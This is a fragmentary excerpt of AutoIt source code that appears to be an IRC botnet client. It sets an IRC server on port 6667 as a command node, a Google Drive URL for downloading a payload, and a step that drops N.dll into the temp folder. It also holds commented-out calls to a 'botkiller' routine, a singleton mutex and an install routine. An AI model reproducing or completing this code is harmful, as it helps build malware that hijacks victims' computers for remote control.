...
EndFunc   ;==>randID
Global $maxthreads = 8
Global $nodes = StringSplit("bofh.nl.smurfnet.ch:6667|", "|", 3)
...
Global $url = "https://drive.google.com/uc?id=1-900lgZi2_OD76BSGnpqO85u2S0hHyQi&export=download"
...
FileInstall("N.dll", @TempDir & "\N.dll")
...
;botkiller()
;Dim $hmutex
;_Singleton("klsajhklasdkfkl", $hmutex)
;install()
